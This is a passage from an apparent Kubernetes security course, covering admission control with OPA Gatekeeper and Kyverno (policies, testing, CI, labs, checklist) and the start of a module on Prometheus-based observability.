K8sAllowedRepos\n      validation:\n        openAPIV3Schema:\n          type: object\n          properties:\n            repos:\n              type: array\n              items:\n                type: string\n  targets:\n  - target: admission.k8s.gatekeeper.sh\n    rego: |\n      package k8sallowedrepos\n\n      violation[{\"msg\": msg}] {\n        container := input.review.object.spec.containers[_]\n        satisfied := [good | repo := input.parameters.repos[_]\n                           good := startswith(container.image, repo)]\n        not any(satisfied)\n        msg := sprintf(\"Image %v not from approved registry\", [container.image])\n      }\n---\napiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sAllowedRepos\nmetadata:\n  name: allowed-registries\nspec:\n  match:\n    kinds:\n    - apiGroups: [\"\"]\n      kinds: [\"Pod\"]\n  parameters:\n    repos:\n    - gcr.io/mycompany/\n    - registry.example.com/\n    - docker.io/library/\n</code></pre></p>"},{"location":"07-admission-policy/#56-audit-and-compliance","title":"5.6 Audit and Compliance","text":"<p>View constraint violations: <pre><code># Check constraint status\nkubectl get constraints\n\n# View violations\nkubectl describe k8srequiredlabels require-owner-env-labels\n\n# Audit existing resources\nkubectl get constraint -o json | jq '.items[].status.violations'\n</code></pre></p> <p>Enable audit logging: <pre><code># In Gatekeeper deployment\nspec:\n  template:\n    spec:\n      containers:\n      - name: manager\n        args:\n        - --audit-interval=60\n        - --log-level=DEBUG\n        - --emit-audit-events=true\n</code></pre></p>"},{"location":"07-admission-policy/#6-kyverno","title":"6. Kyverno","text":""},{"location":"07-admission-policy/#61-kyverno-overview","title":"6.1 Kyverno Overview","text":"<p>Kyverno is a policy engine designed specifically for Kubernetes, using YAML instead of Rego.</p> <p>Key Features: - Native Kubernetes YAML syntax - No new language to learn - Validation, mutation, and generation policies - CLI for testing policies - Policy reports</p>"},{"location":"07-admission-policy/#62-installing-kyverno","title":"6.2 Installing Kyverno","text":"<pre><code># Install using kubectl\nkubectl create -f https://github.com/kyverno/kyverno/releases/download/v1.11.0/install.yaml\n\n# Verify installation\nkubectl get pods -n kyverno\nkubectl get crd | grep kyverno\n</code></pre> <p>Using Helm: <pre><code>helm repo add kyverno https://kyverno.github.io/kyverno/\nhelm install kyverno kyverno/kyverno --namespace kyverno --create-namespace\n</code></pre></p>"},{"location":"07-admission-policy/#63-validation-policies","title":"6.3 Validation Policies","text":"<p>Require Labels: <pre><code>apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: require-labels\nspec:\n  validationFailureAction: Enforce  # or Audit\n  background: true\n\n  rules:\n  - name: check-for-labels\n    match:\n      any:\n      - resources:\n          kinds:\n          - Pod\n          - Deployment\n          - Service\n    validate:\n      message: \"Labels 'owner' and 'environment' are required\"\n      pattern:\n        metadata:\n          labels:\n            owner: \"?*\"\n            environment: \"?*\"\n</code></pre></p> <p>Require Resource Limits: <pre><code>apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: require-resource-limits\nspec:\n  validationFailureAction: Enforce\n\n  rules:\n  - name: validate-resources\n    match:\n      any:\n      - resources:\n          kinds:\n          - Pod\n    validate:\n      message: \"CPU and memory resource limits are required\"\n      pattern:\n        spec:\n          containers:\n          - resources:\n              limits:\n                memory: \"?*\"\n                cpu: \"?*\"\n              requests:\n                memory: \"?*\"\n                cpu: \"?*\"\n</code></pre></p> <p>Block Latest Tag: <pre><code>apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: disallow-latest-tag\nspec:\n  validationFailureAction: Enforce\n\n  rules:\n  - name: require-image-tag\n    match:\n      any:\n      - resources:\n          kinds:\n          - Pod\n    validate:\n      message: \"Using 'latest' tag is not allowed\"\n      pattern:\n        spec:\n          containers:\n          - image: \"!*:latest\"\n\n  - name: require-tag-present\n    match:\n      any:\n      - resources:\n          kinds:\n          - Pod\n    validate:\n      message: \"Image tag is required\"\n      pattern:\n        spec:\n          containers:\n          - image: \"*:*\"\n</code></pre></p>"},{"location":"07-admission-policy/#64-mutation-policies","title":"6.4 Mutation Policies","text":"<p>Add Default Security Context: <pre><code>apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: add-default-securitycontext\nspec:\n  background: false\n\n  rules:\n  - name: set-container-security\n    match:\n      any:\n      - resources:\n          kinds:\n          - Pod\n    mutate:\n      patchStrategicMerge:\n        spec:\n          securityContext:\n            runAsNonRoot: true\n            runAsUser: 1000\n            seccompProfile:\n              type: RuntimeDefault\n          containers:\n          - (name): \"*\"\n            securityContext:\n              allowPrivilegeEscalation: false\n              readOnlyRootFilesystem: true\n              capabilities:\n                drop:\n                - ALL\n</code></pre></p> <p>Add Network Policy: <pre><code>apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: add-default-networkpolicy\nspec:\n  background: true\n\n  rules:\n  - name: default-deny\n    match:\n      any:\n      - resources:\n          kinds:\n          - Namespace\n    generate:\n      synchronize: true\n      kind: NetworkPolicy\n      name: default-deny\n      namespace: \"{{request.object.metadata.name}}\"\n      data:\n        spec:\n          podSelector: {}\n          policyTypes:\n          - Ingress\n          - Egress\n</code></pre></p> <p>Inject Sidecar: <pre><code>apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: inject-logging-sidecar\nspec:\n  background: false\n\n  rules:\n  - name: inject-sidecar\n    match:\n      any:\n      - resources:\n          kinds:\n          - Pod\n          annotations:\n            logging-sidecar: \"true\"\n    mutate:\n      patchesJson6902: |-\n        - op: add\n          path: /spec/containers/-\n          value:\n            name: logging-agent\n            image: fluentd:v1.16\n            volumeMounts:\n            - name: logs\n              mountPath: /var/log/app\n        - op: add\n          path: /spec/volumes/-\n          value:\n            name: logs\n            emptyDir: {}\n</code></pre></p>"},{"location":"07-admission-policy/#65-generation-policies","title":"6.5 Generation Policies","text":"<p>Auto-create ConfigMap for Namespaces: <pre><code>apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: generate-configmap\nspec:\n  background: true\n\n  rules:\n  - name: create-configmap\n    match:\n      any:\n      - resources:\n          kinds:\n          - Namespace\n    exclude:\n      any:\n      - resources:\n          namespaces:\n          - kube-system\n          - kube-public\n          - kube-node-lease\n    generate:\n      synchronize: true\n      kind: ConfigMap\n      name: default-config\n      namespace: \"{{request.object.metadata.name}}\"\n      data:\n        data:\n          environment: \"{{request.object.metadata.labels.environment}}\"\n          owner: \"{{request.object.metadata.labels.owner}}\"\n</code></pre></p>"},{"location":"07-admission-policy/#66-image-verification","title":"6.6 Image Verification","text":"<p>Verify Image Signatures with cosign: <pre><code>apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: verify-images\nspec:\n  validationFailureAction: Enforce\n  webhookTimeoutSeconds: 30\n\n  rules:\n  - name: verify-signature\n    match:\n      any:\n      - resources:\n          kinds:\n          - Pod\n    verifyImages:\n    - imageReferences:\n      - \"registry.example.com/myapp/*\"\n      attestors:\n      - count: 1\n        entries:\n        - keys:\n            publicKeys: |-\n              -----BEGIN PUBLIC KEY-----\n              MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...\n              -----END PUBLIC KEY-----\n</code></pre></p>"},{"location":"07-admission-policy/#67-policy-reports","title":"6.7 Policy Reports","text":"<p>View policy violations: <pre><code># Install Kyverno CLI\ncurl -LO https://github.com/kyverno/kyverno/releases/download/v1.11.0/kyverno-cli_v1.11.0_linux_x86_64.tar.gz\ntar -xzf kyverno-cli_v1.11.0_linux_x86_64.tar.gz\nsudo mv kyverno /usr/local/bin/\n\n# Test policy against resources\nkyverno apply policy.yaml --resource deployment.yaml\n\n# View cluster policy reports\nkubectl get clusterpolicyreport -A\n\n# View policy report details\nkubectl get policyreport -n default -o yaml\n</code></pre></p> <p>PolicyReport Example: <pre><code>apiVersion: wgpolicyk8s.io/v1alpha2\nkind: PolicyReport\nmetadata:\n  name: polr-ns-default\n  namespace: default\nresults:\n- policy: require-labels\n  rule: check-for-labels\n  result: fail\n  message: \"Labels 'owner' and 'environment' are required\"\n  source: kyverno\n  resources:\n  - apiVersion: v1\n    kind: Pod\n    name: nginx\n    namespace: default\n</code></pre></p>"},{"location":"07-admission-policy/#7-policy-as-code-patterns","title":"7. Policy-as-Code Patterns","text":""},{"location":"07-admission-policy/#71-policy-organization","title":"7.1 Policy Organization","text":"<p>Directory Structure: <pre><code>policies/\n\u251c\u2500\u2500 base/\n\u2502   \u251c\u2500\u2500 security/\n\u2502   \u2502   \u251c\u2500\u2500 pod-security.yaml\n\u2502   \u2502   \u251c\u2500\u2500 network-policies.yaml\n\u2502   \u2502   \u2514\u2500\u2500 rbac-restrictions.yaml\n\u2502   \u251c\u2500\u2500 compliance/\n\u2502   \u2502   \u251c\u2500\u2500 require-labels.yaml\n\u2502   \u2502   \u2514\u2500\u2500 resource-limits.yaml\n\u2502   \u2514\u2500\u2500 operational/\n\u2502       \u251c\u2500\u2500 image-policies.yaml\n\u2502       \u2514\u2500\u2500 backup-policies.yaml\n\u251c\u2500\u2500 environments/\n\u2502   \u251c\u2500\u2500 production/\n\u2502   \u2502   \u2514\u2500\u2500 kustomization.yaml\n\u2502   \u251c\u2500\u2500 staging/\n\u2502   \u2502   \u2514\u2500\u2500 kustomization.yaml\n\u2502   \u2514\u2500\u2500 development/\n\u2502       \u2514\u2500\u2500 kustomization.yaml\n\u2514\u2500\u2500 tests/\n    \u2514\u2500\u2500 resources/\n        \u251c\u2500\u2500 compliant/\n        \u2514\u2500\u2500 non-compliant/\n</code></pre></p>"},{"location":"07-admission-policy/#72-policy-testing","title":"7.2 Policy Testing","text":"<p>Create test resources: <pre><code># tests/resources/compliant/good-pod.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: good-pod\n  labels:\n    owner: security-team\n    environment: production\nspec:\n  securityContext:\n    runAsNonRoot: true\n    runAsUser: 1000\n  containers:\n  - name: app\n    image: registry.example.com/app:v1.0\n    securityContext:\n      readOnlyRootFilesystem: true\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n    resources:\n      limits:\n        cpu: 500m\n        memory: 512Mi\n      requests:\n        cpu: 250m\n        memory: 256Mi\n</code></pre></p> <p>Test script: <pre><code>#!/bin/bash\n# test-policies.sh\n\necho \"Testing Kyverno policies...\"\n\n# Test compliant resources (should pass)\nfor file in tests/resources/compliant/*.yaml; do\n    echo \"Testing compliant: $file\"\n    kyverno apply policies/ --resource $file || exit 1\ndone\n\n# Test non-compliant resources (should fail)\nfor file in tests/resources/non-compliant/*.yaml; do\n    echo \"Testing non-compliant: $file\"\n    if kyverno apply policies/ --resource $file; then\n        echo \"ERROR: Non-compliant resource was not blocked!\"\n        exit 1\n    fi\ndone\n\necho \"All policy tests passed!\"\n</code></pre></p>"},{"location":"07-admission-policy/#73-cicd-integration","title":"7.3 CI/CD Integration","text":"<p>GitHub Actions Workflow: <pre><code>name: Policy Validation\n\non:\n  pull_request:\n    paths:\n    - 'policies/**'\n    - 'manifests/**'\n\njobs:\n  validate-policies:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v4\n\n    - name: Install Kyverno CLI\n      run: |\n        curl -LO https://github.com/kyverno/kyverno/releases/download/v1.11.0/kyverno-cli_v1.11.0_linux_x86_64.tar.gz\n        tar -xzf kyverno-cli_v1.11.0_linux_x86_64.tar.gz\n        sudo mv kyverno /usr/local/bin/\n\n    - name: Validate manifests against policies\n      run: |\n        kyverno apply policies/ --resource manifests/ &gt; results.txt\n        cat results.txt\n\n        if grep -q \"fail\" results.txt; then\n          echo \"Policy violations found!\"\n          exit 1\n        fi\n\n    - name: Test policies\n      run: |\n        ./tests/test-policies.sh\n</code></pre></p>"},{"location":"07-admission-policy/#74-policy-exceptions","title":"7.4 Policy Exceptions","text":"<p>Using Kyverno PolicyException: <pre><code>apiVersion: kyverno.io/v2alpha1\nkind: PolicyException\nmetadata:\n  name: allow-legacy-app-root\n  namespace: default\nspec:\n  exceptions:\n  - policyName: require-non-root\n    ruleNames:\n    - validate-runAsNonRoot\n  match:\n    any:\n    - resources:\n        kinds:\n        - Pod\n        names:\n        - legacy-app-*\n        namespaces:\n        - default\n</code></pre></p> <p>Document exceptions: <pre><code>metadata:\n  annotations:\n    exception-reason: \"Legacy application requires root, migrating to non-root in Q2 2024\"\n    approved-by: \"security-team@example.com\"\n    expires: \"2024-06-30\"\n</code></pre></p>"},{"location":"07-admission-policy/#8-best-practices","title":"8. Best Practices","text":""},{"location":"07-admission-policy/#81-policy-design-principles","title":"8.1 Policy Design Principles","text":"<ol> <li>Start with Audit Mode</li> <li>Set <code>validationFailureAction: Audit</code></li> <li>Monitor violations before enforcing</li> <li> <p>Adjust policies based on findings</p> </li> <li> <p>Fail Closed</p> </li> <li>Use <code>failurePolicy: Fail</code> for critical policies</li> <li>Ensure high availability of webhook services</li> <li> <p>Set reasonable timeouts</p> </li> <li> <p>Scope Appropriately</p> </li> <li>Use namespace selectors</li> <li>Exclude system namespaces</li> <li> <p>Apply policies to specific resource kinds</p> </li> <li> <p>Test Thoroughly</p> </li> <li>Test compliant and non-compliant resources</li> <li>Validate policy behavior in CI/CD</li> <li> <p>Use policy testing tools</p> </li> <li> <p>Document Policies</p> </li> <li>Include clear violation messages</li> <li>Document exceptions and rationale</li> <li>Maintain policy catalog</li> </ol>"},{"location":"07-admission-policy/#82-webhook-high-availability","title":"8.2 Webhook High Availability","text":"<p>Multi-replica Deployment: <pre><code>apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: policy-webhook\nspec:\n  replicas: 3\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxUnavailable: 1\n  template:\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchLabels:\n                app: policy-webhook\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: webhook\n        image: policy-webhook:1.0\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 512Mi\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 10\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: 8080\n          initialDelaySeconds: 5\n          periodSeconds: 5\n</code></pre></p>"},{"location":"07-admission-policy/#83-monitoring-policies","title":"8.3 Monitoring Policies","text":"<p>Prometheus Metrics: <pre><code># ServiceMonitor for Gatekeeper\napiVersion: monitoring.coreos.com/v1\nkind: ServiceMonitor\nmetadata:\n  name: gatekeeper\n  namespace: gatekeeper-system\nspec:\n  selector:\n    matchLabels:\n      control-plane: controller-manager\n  endpoints:\n  - port: metrics\n    interval: 30s\n</code></pre></p> <p>Alert Rules: <pre><code>apiVersion: monitoring.coreos.com/v1\nkind: PrometheusRule\nmetadata:\n  name: policy-alerts\nspec:\n  groups:\n  - name: admission-control\n    interval: 30s\n    rules:\n    - alert: HighPolicyViolationRate\n      expr: rate(gatekeeper_violations_total[5m]) &gt; 10\n      annotations:\n        summary: \"High rate of policy violations detected\"\n\n    - alert: WebhookFailureRate\n      expr: rate(apiserver_admission_webhook_rejection_count[5m]) &gt; 0.1\n      annotations:\n        summary: \"Admission webhook failures detected\"\n</code></pre></p>"},{"location":"07-admission-policy/#9-security-anti-patterns","title":"9. Security Anti-Patterns","text":""},{"location":"07-admission-policy/#91-common-mistakes","title":"9.1 Common Mistakes","text":"<p>\u274c Using Ignore Failure Policy <pre><code># BAD: Silently allows violations on webhook failure\nfailurePolicy: Ignore\n</code></pre></p> <p>\u2705 Corrected: <pre><code>failurePolicy: Fail  # Fail closed for security\n# Ensure webhook HA to minimize failures\n</code></pre></p> <p>\u274c Overly Broad Scope <pre><code># BAD: Applies to all namespaces including system\nspec:\n  match:\n    kinds:\n    - apiGroups: [\"*\"]\n      kinds: [\"*\"]\n</code></pre></p> <p>\u2705 Corrected: <pre><code>spec:\n  match:\n    kinds:\n    - apiGroups: [\"\"]\n      kinds: [\"Pod\"]\n  namespaceSelector:\n    matchExpressions:\n    - key: environment\n      operator: In\n      values: [\"production\"]\n  # Exclude system namespaces\n  exclude:\n    namespaces:\n    - kube-system\n    - kube-public\n</code></pre></p> <p>\u274c No Policy Testing <pre><code># BAD: Deploying untested policies to production\nkubectl apply -f new-policy.yaml --validate=false\n</code></pre></p> <p>\u2705 Corrected: <pre><code># Test in audit mode first\nvalidationFailureAction: Audit\n\n# Test with CLI\nkyverno apply policy.yaml --resource test-resources/\n\n# Monitor violations\nkubectl get policyreport -A\n</code></pre></p>"},{"location":"07-admission-policy/#10-hands-on-labs","title":"10. Hands-On Labs","text":""},{"location":"07-admission-policy/#lab-1-deploy-opa-gatekeeper","title":"Lab 1: Deploy OPA Gatekeeper","text":"<p>Objective: Install Gatekeeper and create a policy to require labels.</p> <p>Steps:</p> <ol> <li> <p>Install Gatekeeper: <pre><code>kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.14/deploy/gatekeeper.yaml\nkubectl wait --for=condition=Ready pod -l control-plane=controller-manager -n gatekeeper-system --timeout=90s\n</code></pre></p> </li> <li> <p>Create constraint template: <pre><code>kubectl apply -f - &lt;&lt;EOF\napiVersion: templates.gatekeeper.sh/v1\nkind: ConstraintTemplate\nmetadata:\n  name: k8srequiredlabels\nspec:\n  crd:\n    spec:\n      names:\n        kind: K8sRequiredLabels\n      validation:\n        openAPIV3Schema:\n          type: object\n          properties:\n            labels:\n              type: array\n              items:\n                type: string\n  targets:\n  - target: admission.k8s.gatekeeper.sh\n    rego: |\n      package k8srequiredlabels\n      violation[{\"msg\": msg, \"details\": {\"missing_labels\": missing}}] {\n        provided := {label | input.review.object.metadata.labels[label]}\n        required := {label | label := input.parameters.labels[_]}\n        missing := required - provided\n        count(missing) &gt; 0\n        msg := sprintf(\"Missing required labels: %v\", [missing])\n      }\nEOF\n</code></pre></p> </li> <li> <p>Create constraint: <pre><code>kubectl apply -f - &lt;&lt;EOF\napiVersion: constraints.gatekeeper.sh/v1beta1\nkind: K8sRequiredLabels\nmetadata:\n  name: ns-must-have-owner\nspec:\n  match:\n    kinds:\n    - apiGroups: [\"\"]\n      kinds: [\"Namespace\"]\n  parameters:\n    labels: [\"owner\"]\nEOF\n</code></pre></p> </li> <li> <p>Test policy: <pre><code># Should fail\nkubectl create namespace test-ns\n\n# Should succeed\nkubectl create namespace test-ns-2 --labels=owner=john\n</code></pre></p> </li> </ol>"},{"location":"07-admission-policy/#lab-2-deploy-kyverno-policy","title":"Lab 2: Deploy Kyverno Policy","text":"<p>Objective: Install Kyverno and enforce image policies.</p> <p>Steps:</p> <ol> <li> <p>Install Kyverno: <pre><code>kubectl create -f https://github.com/kyverno/kyverno/releases/download/v1.11.0/install.yaml\nkubectl wait --for=condition=Ready pod -l app.kubernetes.io/name=kyverno -n kyverno --timeout=90s\n</code></pre></p> </li> <li> <p>Create image policy: <pre><code>kubectl apply -f - &lt;&lt;EOF\napiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: restrict-image-registries\nspec:\n  validationFailureAction: Enforce\n  rules:\n  - name: validate-registries\n    match:\n      any:\n      - resources:\n          kinds:\n          - Pod\n    validate:\n      message: \"Images must be from approved registries\"\n      pattern:\n        spec:\n          containers:\n          - image: \"docker.io/*|gcr.io/*|registry.k8s.io/*\"\nEOF\n</code></pre></p> </li> <li> <p>Test policy: <pre><code># Should fail (unapproved registry)\nkubectl run test --image=quay.io/nginx:latest\n\n# Should succeed\nkubectl run test --image=docker.io/nginx:1.25\n</code></pre></p> </li> </ol>"},{"location":"07-admission-policy/#lab-3-mutation-policy","title":"Lab 3: Mutation Policy","text":"<p>Objective: Create a policy that automatically adds security contexts.</p> <pre><code>kubectl apply -f - &lt;&lt;EOF\napiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: add-security-context\nspec:\n  background: false\n  rules:\n  - name: add-default-security\n    match:\n      any:\n      - resources:\n          kinds:\n          - Pod\n    mutate:\n      patchStrategicMerge:\n        spec:\n          securityContext:\n            runAsNonRoot: true\n            runAsUser: 1000\n          containers:\n          - (name): \"*\"\n            securityContext:\n              allowPrivilegeEscalation: false\n              capabilities:\n                drop:\n                - ALL\nEOF\n\n# Test mutation\nkubectl run test-mutation --image=nginx:1.25\nkubectl get pod test-mutation -o yaml | grep -A 10 securityContext\n</code></pre>"},{"location":"07-admission-policy/#11-security-checklist","title":"11. Security Checklist","text":"<ul> <li>[ ] Admission Controller Configuration</li> <li>[ ] All recommended admission controllers enabled</li> <li>[ ] Dynamic admission enabled (MutatingAdmissionWebhook, ValidatingAdmissionWebhook)</li> <li>[ ] NodeRestriction enabled</li> <li> <p>[ ] PodSecurity enabled</p> </li> <li> <p>[ ] Policy Engine Deployed</p> </li> <li>[ ] OPA Gatekeeper or Kyverno installed</li> <li>[ ] Policy engine highly available (multiple replicas)</li> <li> <p>[ ] Metrics and monitoring configured</p> </li> <li> <p>[ ] Security Policies</p> </li> <li>[ ] Require non-root containers</li> <li>[ ] Block privileged containers</li> <li>[ ] Enforce read-only root filesystem</li> <li>[ ] Require resource limits</li> <li>[ ] Restrict host namespaces</li> <li>[ ] Block host path volumes</li> <li>[ ] Enforce approved registries</li> <li> <p>[ ] Block latest image tags</p> </li> <li> <p>[ ] Compliance Policies</p> </li> <li>[ ] Required labels enforced</li> <li>[ ] Required annotations enforced</li> <li> <p>[ ] Naming conventions validated</p> </li> <li> <p>[ ] Policy Testing</p> </li> <li>[ ] Policies tested before enforcement</li> <li>[ ] CI/CD integration for policy validation</li> <li> <p>[ ] Regular policy audits</p> </li> <li> <p>[ ] Webhook Security</p> </li> <li>[ ] Webhooks use TLS with valid certificates</li> <li>[ ] Webhook endpoints authenticated</li> <li>[ ] failurePolicy: Fail for critical policies</li> <li>[ ] Reasonable timeout configured</li> </ul>"},{"location":"07-admission-policy/#12-references","title":"12. References","text":""},{"location":"07-admission-policy/#official-documentation","title":"Official Documentation","text":"<ol> <li>Admission Controllers</li> <li> <p>https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/</p> </li> <li> <p>Dynamic Admission Control</p> </li> <li> <p>https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/</p> </li> <li> <p>Validating Admission Webhooks</p> </li> <li> <p>https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#validatingadmissionwebhook</p> </li> <li> <p>Mutating Admission Webhooks</p> </li> <li>https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#mutatingadmissionwebhook</li> </ol>"},{"location":"07-admission-policy/#policy-engines","title":"Policy Engines","text":"<ol> <li>OPA Gatekeeper</li> <li> <p>https://open-policy-agent.github.io/gatekeeper/</p> </li> <li> <p>Gatekeeper Library</p> </li> <li> <p>https://github.com/open-policy-agent/gatekeeper-library</p> </li> <li> <p>Kyverno Documentation</p> </li> <li> <p>https://kyverno.io/docs/</p> </li> <li> <p>Kyverno Policies</p> </li> <li>https://kyverno.io/policies/</li> </ol>"},{"location":"07-admission-policy/#rego-language","title":"Rego Language","text":"<ol> <li>OPA Rego Documentation</li> <li> <p>https://www.openpolicyagent.org/docs/latest/policy-language/</p> </li> <li> <p>Rego Playground</p> <ul> <li>https://play.openpolicyagent.org/</li> </ul> </li> </ol>"},{"location":"07-admission-policy/#security-standards","title":"Security Standards","text":"<ol> <li> <p>CIS Kubernetes Benchmark</p> <ul> <li>https://www.cisecurity.org/benchmark/kubernetes</li> </ul> </li> <li> <p>NSA/CISA Hardening Guide</p> <ul> <li>https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF</li> </ul> </li> </ol>"},{"location":"07-admission-policy/#next-steps","title":"Next Steps","text":"<p>Continue to Module 08: Observability and Logging to learn about monitoring, logging, and security event detection in Kubernetes.</p> <p>Module Completion Status: \u2705 Complete</p>"},{"location":"08-observability/","title":"Module 08: Observability and Logging","text":""},{"location":"08-observability/#overview","title":"Overview","text":"<p>Estimated Time: 6-7 hours</p> <p>Module Type: Security Deep Dive</p> <p>Prerequisites: - Module 02 - Control Plane and Cluster Components - Module 03 - Networking Fundamentals - Understanding of metrics, logs, and distributed tracing concepts - Basic knowledge of Prometheus and Grafana</p> <p>Observability is critical for detecting security incidents, troubleshooting issues, and maintaining cluster health. This module covers the three pillars of observability (metrics, logs, traces), deploying monitoring stacks (Prometheus, Grafana), implementing security-focused logging, Kubernetes audit logging, and alerting on security events. You'll learn to build comprehensive observability systems for production Kubernetes clusters.</p>"},{"location":"08-observability/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Understand the three pillars of observability (metrics, logs, traces)</li> <li>Deploy and configure Prometheus for Kubernetes monitoring</li> <li>Create Grafana dashboards for security and operational metrics</li> <li>Implement centralized logging with Fluentd/Fluent Bit</li> <li>Configure Kubernetes audit logging for security events</li> <li>Deploy OpenTelemetry for distributed tracing</li> <li>Create security-focused alerts and runbooks</li> <li>Query logs and metrics for security investigations</li> <li>Implement log retention and compliance requirements</li> <li>Build end-to-end observability pipelines</li> </ol>"},{"location":"08-observability/#1-observability-fundamentals","title":"1. Observability Fundamentals","text":""},{"location":"08-observability/#11-the-three-pillars-of-observability","title":"1.1 The Three Pillars of Observability","text":"<pre><code>graph TB\n    A[Observability] --&gt; B[Metrics]\n    A --&gt; C[Logs]\n    A --&gt; D[Traces]\n\n    B --&gt; B1[Time-series data]\n    B --&gt; B2[Aggregations]\n    B --&gt; B3[Prometheus/Thanos]\n\n    C --&gt; C1[Event records]\n    C --&gt; C2[Structured logging]\n    C --&gt; C3[Fluentd/Loki]\n\n    D --&gt; D1[Request flows]\n    D --&gt; D2[Latency analysis]\n    D --&gt; D3[Jaeger/Tempo]\n\n    style B fill:#6bcf7f\n    style C fill:#ffd93d\n    style D fill:#4da6ff</code></pre> <p>Metrics: - Numerical measurements over time - CPU usage, memory consumption, request rates - Efficient for dashboards and alerting - Tools: Prometheus, Thanos, Cortex</p> <p>Logs: - Discrete event records - Application logs, audit logs, system logs - Detailed context for investigations - Tools: Fluentd, Fluent Bit, Loki, Elasticsearch</p> <p>Traces: - Request lifecycle tracking - Distributed transaction flows - Identify performance bottlenecks - Tools: Jaeger, Tempo, Zipkin, OpenTelemetry</p>"},{"location":"08-observability/#12-kubernetes-observability-architecture","title":"1.2 Kubernetes Observability Architecture","text":"<pre><code>graph TB\n    subgraph \"Kubernetes Cluster\"\n        A[Pods/Containers]\n        B[Kubelet]\n        C[API Server]\n        D[Control Plane]\n    end\n\n    subgraph \"Metrics\"\n        E[cAdvisor]\n        F[Metrics Server]\n        G[Prometheus]\n        H[Grafana]\n    end\n\n    subgraph \"Logs\"\n        I[Container Logs]\n        J[Fluentd/Fluent Bit]\n        K[Log Storage]\n        L[Elasticsearch/Loki]\n    end\n\n    subgraph \"Traces\"\n        M[OpenTelemetry]\n        N[Jaeger/Tempo]\n    end\n\n    A --&gt;|Container Metrics| E\n    B --&gt;|Node Metrics| E\n    E --&gt; G\n    C --&gt;|Audit Logs| J\n    A --&gt;|App Logs| I\n    I --&gt; J\n    J --&gt; K\n    K --&gt; L\n    G --&gt; H\n    F --&gt; G\n    A --&gt;|Traces| M\n    M --&gt; N\n\n    style G fill:#e76f51\n    style J fill:#2a9d8f\n    style M fill:#e9c46a</code></pre>"},{"location":"08-observability/#13-observability-for-security","title":"1.3 Observability for Security","text":"<p>Security Use Cases: - Detect anomalous behavior (unusual API calls, resource consumption) - Track authentication/authorization failures - Monitor policy violations - Audit trail for compliance - Incident response and forensics - Vulnerability detection - Lateral movement detection</p>"},{"location":"08-observability/#2-prometheus-stack-deployment","title":"2. Prometheus Stack Deployment","text":""},{"location":"08-observability/#21-prometheus-overview","title":"2.1 Prometheus Overview","text":"<p>Prometheus is a time-series database and monitoring system that scrapes metrics from instrumented targets.</p> <p>Key Components: - Prometheus Server - Scrapes and stores metrics - Alertmanager - Handles alerts - Node Exporter - Hardware and OS metrics - kube-state-metrics - Kubernetes object state - Pushgateway - For short-lived jobs</p>"},{"location":"08-observability/#22-installing-prometheus-operator","title":"2.2 Installing Prometheus Operator","text":"<p>Using Helm (kube-prometheus-stack): <pre><code># Add Prometheus community Helm repository\nhelm repo add prometheus-community https://prometheus-community.github.io/helm-charts\nhelm repo update\n\n# Create namespace\nkubectl create namespace monitoring\n\n# Install kube-prometheus-stack\nhelm install prometheus prometheus-community/kube-prometheus-stack \\\n  --namespace monitoring \\\n  --set prometheus.prometheusSpec.retention=30d \\\n  --set prometheus.prometheusSpec.storageSpec.volumeClaimTemplate.spec.resources.requests.storage=50Gi \\\n  --set grafana.adminPassword=SecurePassword123! \\\n  --set prometheus.prometheusSpec.securityContext.runAsNonRoot=true \\\n  --set prometheus.prometheusSpec.securityContext.runAsUser=65534\n\n# Verify installation\nkubectl get pods -n monitoring\n</code></pre></p> <p>Verify services: <pre><code>kubectl get svc -n monitoring\n\n# Expected services:\n# - prometheus-kube-prometheus-prometheus\n# - prometheus-kube-state-metrics\n# - prometheus-prometheus-node-exporter\n# - alertmanager-operated\n# - prometheus-grafana\n</code></pre></p>"},{"location":"08-observability/#23-prometheus-configuration","title":"2.3 Prometheus Configuration","text":"<p>ServiceMonitor for Custom Application: <pre><code>apiVersion: monitoring.coreos.com/v1\nkind: ServiceMonitor\nmetadata:\n  name: myapp-monitor\n  namespace: production\n  labels:\n    release: prometheus\nspec:\n  selector:\n    matchLabels:\n      app: myapp\n  endpoints:\n  - port: metrics\n    interval: 30s\n    path: /metrics\n    scheme: http\n</code></pre></p> <p>PodMonitor Example: <pre><code>apiVersion: monitoring.coreos.com/v1\nkind: PodMonitor\nmetadata:\n  name: pod-monitor\n  namespace: monitoring\nspec:\n  selector:\n    matchLabels:\n      app: 